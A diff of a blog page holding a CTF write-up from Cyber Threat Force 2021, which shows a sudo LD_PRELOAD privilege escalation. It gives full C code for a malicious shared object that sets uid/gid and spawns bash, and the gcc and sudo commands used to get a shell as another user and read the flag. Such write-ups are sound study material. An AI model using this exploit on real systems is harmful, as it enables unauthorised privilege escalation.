@@ -4,24 +4,23 @@ We also notice env_keep += LD_PRELOAD. From there, we can try an LD_PRELOAD expl
 #<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/pwn/>pwn</a>&nbsp;</span><div class=post-content><div><p>For this challenge, we were given SSH access to a machine, as the user <code>ctf</code>. After running <code>sudo -l</code>, we quickly find that we can run the <code>/opt/Ivazov</code> binary as <code>ctf_cracked</code>. The user in question has a <code>flag.txt</code> file in their home, which only they can read.</p><p>We also notice <code>env_keep += LD_PRELOAD</code>. From there, we can try an <a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld_preload>LD_PRELOAD exploit</a>. The steps taken here are copied from the guide was was just linked.</p><p>We save this code in <code>/tmp/pe.c</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>_init</span>() {
-</span></span><span style=display:flex><span>    unsetenv(<span style=color:#e6db74>&#34;LD_PRELOAD&#34;</span>);
-</span></span><span style=display:flex><span>    setgid(<span style=color:#ae81ff>0</span>);
-</span></span><span style=display:flex><span>    setuid(<span style=color:#ae81ff>0</span>);
-</span></span><span style=display:flex><span>    system(<span style=color:#e6db74>&#34;/bin/bash&#34;</span>);
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>We compile and run it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cd /tmp
-</span></span><span style=display:flex><span>$ <span style=color:#75715e># write the code to pe.c</span>
-</span></span><span style=display:flex><span>$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
-</span></span><span style=display:flex><span>$ sudo -u ctf_cracked LD_PRELOAD<span style=color:#f92672>=</span>pe.so /opt/Ivazov
-</span></span><span style=display:flex><span>$ <span style=color:#75715e># shell as ctf_cracked</span>
-</span></span></code></pre></div><p>And we can now cat <code>/home/ctf_cracked/flag.txt</code>: <code>CYBERTF{LD_PRELOAD_2_Bypass_Ivazov}</code>.</p><p>You can <a href=/blog/cyber-threat-force-ctf/>read other writeups</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-misc-return-to-the-school/><span class=button__icon>←</span>
+#<a href=https://nicolasb.fr/tags/pwn/>pwn</a>&nbsp;</span><div class=post-content><div><p>For this challenge, we were given SSH access to a machine, as the user <code>ctf</code>. After running <code>sudo -l</code>, we quickly find that we can run the <code>/opt/Ivazov</code> binary as <code>ctf_cracked</code>. The user in question has a <code>flag.txt</code> file in their home, which only they can read.</p><p>We also notice <code>env_keep += LD_PRELOAD</code>. From there, we can try an <a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld_preload>LD_PRELOAD exploit</a>. The steps taken here are copied from the guide was was just linked.</p><p>We save this code in <code>/tmp/pe.c</code>:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>_init</span>() {
+    unsetenv(<span style=color:#e6db74>&#34;LD_PRELOAD&#34;</span>);
+    setgid(<span style=color:#ae81ff>0</span>);
+    setuid(<span style=color:#ae81ff>0</span>);
+    system(<span style=color:#e6db74>&#34;/bin/bash&#34;</span>);
+}
+</code></pre></div><p>We compile and run it:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cd /tmp
+$ <span style=color:#75715e># write the code to pe.c</span>
+$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
+$ sudo -u ctf_cracked LD_PRELOAD<span style=color:#f92672>=</span>pe.so /opt/Ivazov
+$ <span style=color:#75715e># shell as ctf_cracked</span>
+</code></pre></div><p>And we can now cat <code>/home/ctf_cracked/flag.txt</code>: <code>CYBERTF{LD_PRELOAD_2_Bypass_Ivazov}</code>.</p><p>You can <a href=/blog/cyber-threat-force-ctf/>read other writeups</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-misc-return-to-the-school/><span class=button__icon>←</span>
 <span class=button__text>Writeup Cyber Threat Force : Return to the school</span></a></span>
 <span class="button next"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-3/><span class=button__text>Writeup Cyber Threat Force : bof_3</span>
-<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2022 Powered by <a href=http://gohugo.io>Hugo</a></span>
-<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script>
-<script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
+<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2025 Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script><script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
